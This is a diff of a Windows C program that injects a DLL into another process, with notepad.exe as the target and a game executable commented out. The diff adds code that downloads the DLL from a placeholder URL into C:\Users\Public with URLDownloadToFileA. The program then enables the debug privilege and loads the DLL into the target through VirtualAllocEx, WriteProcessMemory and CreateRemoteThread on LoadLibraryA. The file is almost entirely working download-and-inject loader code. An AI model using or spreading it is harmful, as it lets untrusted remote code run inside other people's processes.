@@ -1,12 +1,13 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <Windows.h>
 #include <TlHelp32.h>
+#include <urlmon.h>
 
 #define LLDLL 0
 
 #if LLDLL
 #include <stdio.h>
-#include "msgbox_bin.h" // generate from HxD->Export->C
+//#include "msgbox_bin.h" // generate from HxD->Export->C
 #endif
 
 #if NDEBUG
@@ -34,6 +35,10 @@ HANDLE FindProcess(const wchar_t* exe)
 	return ret;
 }
 
+#define TARGETEXE L"notepad.exe"
+//#define TARGETEXE L"hl2.exe"
+#define DLLURL "http://example.org/example.dll"
+
 void real_stuff()
 {
 	HANDLE token, process;
@@ -42,8 +47,11 @@ void real_stuff()
 	LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
 	AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
 
-	while (!(process = FindProcess(L"calc.exe")))
+	while (!(process = FindProcess(TARGETEXE)))
 		Sleep(1000);
+
+	//Sleep(20000);
+	Sleep(1000);
 
 	void* remotemem = VirtualAllocEx(process, 0, 256, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (remotemem == 0) return; // get rid of some dumb squiglys under calls
@@ -69,10 +77,17 @@ void real_stuff()
 	WriteProcessMemory(process, remotemem, buf, sizeof(buf), NULL);
 	CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remotemem, 0, 0, NULL);
 #else
+#if 1
 	const char dllname[] = "C:\\Users\\Public\\msgbox.dll";
+#if 0
 	FILE* f = fopen(dllname, "wb+");
 	fwrite(msgbox_bin, 1, sizeof(msgbox_bin), f);
 	fclose(f);
+#else
+	if (GetFileAttributesA(dllname) == -1)
+		URLDownloadToFileA(NULL, DLLURL, dllname, 0, NULL);
+#endif
+#endif
 
 	WriteProcessMemory(process, remotemem, dllname, sizeof(dllname), NULL);
 	CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, remotemem, 0, NULL);
